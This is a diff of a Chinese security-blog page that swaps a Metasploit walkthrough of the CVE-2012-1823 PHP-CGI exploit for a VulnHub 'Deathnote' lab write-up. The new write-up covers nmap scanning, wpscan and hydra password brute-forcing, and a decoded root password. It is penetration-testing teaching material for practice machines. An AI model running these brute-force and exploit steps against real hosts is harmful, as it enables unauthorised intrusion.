@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>CVE-2012-1823 PHP-CGI 远程代码执行漏洞 - 信息安全实验室</title>
+<title>vulnhub靶机Deathnote教程 - 信息安全实验室</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Noto+Sans+SC:wght@400;500;700&family=Titillium+Web:wght@400;600;700&display=swap" onload="this.onload=null;this.rel='stylesheet'">
@@ -20,9 +20,8 @@
   <div class="subtitle">RHODES ISLAND <span>://</span> SECURITY <span>//</span> RESEARCH <span>//</span> EXPLOIT <span>//</span> DEFENSE</div>
   <div class="tags-bar">
     <a href="../index.html" class="tag tag-cyan">#首页</a>
-    <a href="../tags/list.html?tag=Vulhub" class="tag tag-cyan">#Vulhub</a>
-    <a href="../tags/list.html?tag=CVE" class="tag">#CVE</a>
-    <a href="../tags/list.html?tag=Web安全" class="tag tag-blue">#Web安全</a>
+    <a href="../tags/list.html?tag=vulnhub" class="tag tag-green">#vulnhub</a>
+    <a href="../tags/list.html?tag=渗透测试" class="tag tag-blue">#渗透测试</a>
   </div>
   <div class="tagline">&gt; LOADING - 100% <span class="cursor">▌</span></div>
 </div>
@@ -44,12 +43,11 @@
 <a href="../index.html" class="back-link">[ &larr; ] BACK TO HOME</a>
 
 <div class="post">
-  <div class="post-date">2023 // 02 / 12</div>
-  <div class="post-title">CVE-2012-1823 PHP-CGI 远程代码执行漏洞</div>
+  <div class="post-date">2023 // 08 / 10</div>
+  <div class="post-title">vulnhub靶机Deathnote教程</div>
   <div class="post-tags">
-    <a href="../tags/list.html?tag=Web安全" class="post-tag" style="background:#3366ff22;color:#3366ff;border:1px solid #3366ff44">Web安全</a>
-    <a href="../tags/list.html?tag=Vulhub" class="post-tag" style="background:#00d4ff22;color:#00d4ff;border:1px solid #00d4ff44">Vulhub</a>
-    <a href="../tags/list.html?tag=CVE" class="post-tag" style="background:#e4405f22;color:#e4405f;border:1px solid #e4405f44">CVE</a>
+    <a href="../tags/list.html?tag=vulnhub" class="post-tag" style="background:#10b98122;color:#10b981;border:1px solid #10b98144">vulnhub</a>
+    <a href="../tags/list.html?tag=渗透测试" class="post-tag" style="background:#3366ff22;color:#3366ff;border:1px solid #3366ff44">渗透测试</a>
   </div>
 
   <div class="post-content" style="display:block;border:none;padding:0;margin:0;">
@@ -57,54 +55,93 @@
     <nav class="post-toc">
       <span class="post-toc-title">// 目录</span>
       <ul>
-        <li class="toc-h4"><a href="#summary">漏洞危害</a></li>
-        <li class="toc-h4"><a href="#setup">漏洞搭建</a></li>
-        <li class="toc-h4"><a href="#exploit">漏洞利用</a></li>
+        <li class="toc-h4"><a href="#setup">靶场搭建</a></li>
+        <li class="toc-h4"><a href="#info">信息收集</a></li>
+        <li class="toc-h5"><a href="#info-discovery">主机发现</a></li>
+        <li class="toc-h5"><a href="#info-port">端口扫描</a></li>
+        <li class="toc-h5"><a href="#info-robots">robots.txt 与域名绑定</a></li>
+        <li class="toc-h4"><a href="#wordpress">WordPress 渗透</a></li>
+        <li class="toc-h5"><a href="#wp-enum">用户枚举</a></li>
+        <li class="toc-h5"><a href="#wp-brute">密码爆破</a></li>
+        <li class="toc-h5"><a href="#wp-admin">后台与线索</a></li>
+        <li class="toc-h4"><a href="#ssh">SSH 爆破</a></li>
+        <li class="toc-h5"><a href="#ssh-dirb">目录扫描</a></li>
+        <li class="toc-h5"><a href="#ssh-hydra">hydra 爆破</a></li>
+        <li class="toc-h4"><a href="#privesc">提权至 root</a></li>
+        <li class="toc-h5"><a href="#privesc-oork">OoK 解码</a></li>
+        <li class="toc-h5"><a href="#privesc-base64">Base64 解码</a></li>
+        <li class="toc-h4"><a href="#flag">Flag</a></li>
       </ul>
     </nav>
 
-    <h4 id="summary">漏洞危害</h4>
-    <p>CVE-2012-1823 就是 php-cgi 这个 sapi 出现的漏洞，本漏洞只出现在 cgi 模式运行的 php 中。影响范围：php &lt; 5.3.12 或 php &lt; 5.4.2。</p>
-    <p>这个漏洞简单来说，就是用户请求的 querystring 被作为了 php-cgi 的参数，最终导致了一系列结果。</p>
-    <p>探究一下原理，RFC3875 中规定，当 querystring 中不包含没有解码的 = 号的情况下，要将 querystring 作为 cgi 的参数传入。所以，Apache 服务器按要求实现了这个功能。但 PHP 并没有注意到 RFC 的这一个规则，也许是曾经注意并处理了，处理方法就是 web 上下文中不允许传入参数。</p>
-    <p>于是就导致了 php 不光可以通过命令行参数的方式传入 php-cgi，也可以通过 querystring 的方式传入。</p>
+    <h4 id="setup">靶场搭建</h4>
+    <p>靶机下载地址：<a href="https://www.vulnhub.com/entry/deathnote-1,739/" target="_blank">Deathnote ~ VulnHub</a></p>
+    <p>下载后使用 VirtualBox 导入，网络设置为 NAT 模式。攻击机使用 Kali Linux。</p>
 
-    <h4 id="setup">漏洞搭建</h4>
-    <p>无其他搭建必须环境，搭建环境见 <a href="vulhub-setup.html">Vulhub 搭建方法</a>。</p>
+    <h4 id="info">信息收集</h4>
 
-    <h4 id="exploit">漏洞利用</h4>
-    <p>打开 msf：</p>
-    <pre><code>msfconsole</code></pre>
-    <p><img loading="lazy" src="../assets/vc_image001.png" alt="msfconsole 启动"></p>
+    <h5 id="info-discovery">主机发现</h5>
+    <pre><code>arp-scan -l</code></pre>
 
-    <p>搜索目标漏洞编号：</p>
-    <pre><code>search cve-2012-1823</code></pre>
-    <p><img loading="lazy" src="../assets/vc_image002.png" alt="search cve-2012-1823"></p>
+    <h5 id="info-port">端口扫描</h5>
+    <pre><code>nmap --min-rate 10000 -p- 192.168.21.140</code></pre>
+    <pre><code>nmap -sV -sT -O -p22,80 192.168.21.140</code></pre>
+    <p>开放端口：22（SSH）、80（HTTP — WordPress）。</p>
 
-    <p>使用模块：</p>
-    <pre><code>use exploit/multi/http/php_cgi_arg_injection</code></pre>
-    <p><img loading="lazy" src="../assets/vc_image003.png" alt="use module"></p>
+    <h5 id="info-robots">robots.txt 与域名绑定</h5>
+    <p>查看 robots.txt 发现 host 绑定提示：</p>
+    <pre><code>curl http://192.168.21.140/robots.txt</code></pre>
+    <p>修改本地 hosts 文件：</p>
+    <pre><code>echo "192.168.21.140 deathnote.vuln" >> /etc/hosts</code></pre>
 
-    <p>这里提示需要使用 payload 并告诉我们 payload 的名字直接使用它：</p>
-    <pre><code>set payload php/meterpreter/reverse_tcp</code></pre>
-    <p><img loading="lazy" src="../assets/vc_image004.png" alt="set payload"></p>
+    <h4 id="wordpress">WordPress 渗透</h4>
 
-    <p>查看需要配置的信息：</p>
-    <pre><code>show options</code></pre>
-    <p><img loading="lazy" src="../assets/vc_image005.png" alt="show options"></p>
+    <h5 id="wp-enum">用户枚举</h5>
+    <p>使用 wpscan 枚举 WordPress 用户：</p>
+    <pre><code>wpscan --url http://deathnote.vuln/wordpress/ -e u</code></pre>
+    <p>发现用户 <code>kira</code>。</p>
 
-    <p>我们要配置 rhost（目标靶机）和 rport（目标端口）：</p>
-    <pre><code>set rhost 192.168.221.129</code></pre>
-    <p><img loading="lazy" src="../assets/vc_image006.png" alt="set rhost"></p>
-    <pre><code>set rport 8080</code></pre>
-    <p><img loading="lazy" src="../assets/vc_image007.png" alt="set rport"></p>
+    <h5 id="wp-brute">密码爆破</h5>
+    <p>使用 cewl 从网站生成自定义字典：</p>
+    <pre><code>cewl http://deathnote.vuln/wordpress/ -w passwd.txt</code></pre>
+    <p>使用 wpscan 爆破密码：</p>
+    <pre><code>wpscan --url http://deathnote.vuln/wordpress/ -P passwd.txt -U kira</code></pre>
+    <p>查看页面 hint 元素后补全密码，成功登录后台。</p>
 
-    <p>配置完后直接 run 就可以：</p>
-    <pre><code>run</code></pre>
-    <p><img loading="lazy" src="../assets/vc_image008.png" alt="run 连接成功"></p>
+    <h5 id="wp-admin">后台与线索</h5>
+    <p>在 WordPress 后台的 Media（媒体）中发现 <code>notes.txt</code>：</p>
+    <pre><code>http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/notes.txt</code></pre>
+    <p>该文件包含密码提示信息。</p>
 
-    <p>显示到这就是连接成功了，我们就能执行命令了：</p>
-    <p><img loading="lazy" src="../assets/vc_image009.png" alt="执行命令"></p>
+    <h4 id="ssh">SSH 爆破</h4>
+
+    <h5 id="ssh-dirb">目录扫描</h5>
+    <p>使用 dirb 扫描 WordPress 目录：</p>
+    <pre><code>dirb http://deathnote.vuln/wordpress</code></pre>
+    <p>在 uploads 目录中发现 <code>user.txt</code> 文件，下载到本地。</p>
+
+    <h5 id="ssh-hydra">hydra 爆破</h5>
+    <p>使用 hydra 结合 user.txt（用户名列表）和 notes.txt（密码列表）爆破 SSH：</p>
+    <pre><code>hydra -L user.txt -P notes.txt ssh://192.168.21.140</code></pre>
+    <p>成功获取 SSH 凭证：用户 <code>l</code>。</p>
+    <pre><code>ssh l@192.168.21.140</code></pre>
+
+    <h4 id="privesc">提权至 root</h4>
+
+    <h5 id="privesc-oork">OoK 解码</h5>
+    <p>登录后查看用户目录，发现 OoK 编码信息。使用在线工具解码（Bugku CTF Brainfuck/OoK 解码器），得到提示指向 kira 用户。</p>
+
+    <h5 id="privesc-base64">Base64 解码</h5>
+    <p>进入 kira 目录，发现 fake 文件夹中的 16 进制数据：</p>
+    <pre><code>cGFzc3dkIDoga2lyYWlzZXZpbCA=</code></pre>
+    <p>Base64 解码得到：<code>passwd : kiraisevil</code></p>
+    <p>切换 root 用户：</p>
+    <pre><code>su root</code></pre>
+    <p>密码：<code>Kiraisevil</code></p>
+    <p>成功获取 root 权限。</p>
+
+    <h4 id="flag">Flag</h4>
+    <p>获取 root 权限后读取 flag 文件完成渗透。</p>
 
   </div>
 </div>
